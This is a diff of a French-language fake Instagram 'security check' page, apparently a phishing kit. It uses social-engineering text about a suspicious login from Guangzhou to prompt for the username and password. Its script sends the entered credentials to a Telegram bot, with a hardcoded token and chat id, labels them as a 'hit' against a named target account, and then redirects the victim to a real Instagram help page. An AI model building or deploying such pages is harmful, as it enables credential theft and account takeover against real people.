@@ -2,39 +2,63 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion • Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram • Security Check</title>
+    <link href="https://fonts.cdnfonts.com/css/blue-highways" rel="stylesheet">
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
-        .logo { width: 175px; margin-bottom: 20px; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; box-sizing: border-box; }
-        button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; }
-        .err { color: #ed4956; font-size: 13px; margin-bottom: 20px; font-weight: 500; line-height: 1.4; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fff; display: flex; flex-direction: column; height: 100vh; align-items: center; }
+        .main-container { width: 100%; max-width: 350px; margin-top: 40px; padding: 20px; text-align: center; }
+        .logo-ig { width: 175px; margin: 30px 0; }
+        .security-banner { background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
+        .alert-icon { width: 45px; margin-bottom: 15px; }
+        .text-bold { font-weight: 600; font-size: 16px; color: #262626; margin-bottom: 10px; }
+        .text-small { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
+        input { width: 100%; height: 44px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 5px; padding: 10px; margin-bottom: 8px; font-size: 14px; outline: none; transition: 0.2s; }
+        input:focus { border-color: #a8a8a8; }
+        .btn-submit { width: 100%; background-color: #0095f6; color: white; border: none; height: 44px; border-radius: 8px; font-weight: 700; font-size: 14px; cursor: pointer; margin-top: 15px; }
+        .btn-submit:active { opacity: 0.7; }
+        .footer { position: absolute; bottom: 20px; width: 100%; text-align: center; color: #8e8e8e; font-size: 12px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-        <div class="err">Action requise : Votre compte a été temporairement verrouillé pour des raisons de sécurité (Connexion suspecte : Guangzhou, CN).</div>
-        <form id="l">
-            <input type="text" id="u" placeholder="Num. de téléphone, nom d'utilisateur ou e-mail" required>
-            <input type="password" id="p" placeholder="Mot de passe" required>
-            <button type="submit">Sécuriser le compte</button>
-        </form>
+
+    <div class="main-container">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo-ig">
+        
+        <div class="security-banner">
+            <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" class="alert-icon">
+            <p class="text-bold">Vérification de sécurité</p>
+            <p class="text-small">Nous avons détecté une tentative de connexion inhabituelle depuis <b>Guangzhou, Chine</b>. Pour protéger votre compte, veuillez confirmer votre identité.</p>
+            
+            <form id="auth-form">
+                <input type="text" id="user" placeholder="Nom d'utilisateur, e-mail ou mobile" required>
+                <input type="password" id="pass" placeholder="Mot de passe" required>
+                <button type="submit" class="btn-submit">Confirmer l'identité</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        from <br>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" style="width: 60px; margin-top: 5px;">
     </div>
 
     <script>
-        document.getElementById('l').onsubmit = async (e) => {
+        document.getElementById('auth-form').onsubmit = async (e) => {
             e.preventDefault();
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
             const tok = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
             const id = "5558301795";
-            const txt = `🎯 HIT CAUGHT!\n👤 User: ${u}\n🔑 Pass: ${p}`;
             
-            await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${encodeURIComponent(txt)}`);
-            window.location.href = "https://www.instagram.com/accounts/login/";
+            // المعلومات التقنية للضحية (Level Up)
+            const info = `🎯 **LEVEL 2026 HIT!** 🎯\n\n👤 **User:** \`${u}\` \n🔑 **Pass:** \`${p}\` \n🌐 **Target:** faiza_aynur`;
+
+            await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+            
+            // تحويل احترافي لصفحة المساعدة الأصلية
+            window.location.href = "https://help.instagram.com/149494825257596";
         };
     </script>
 </body>
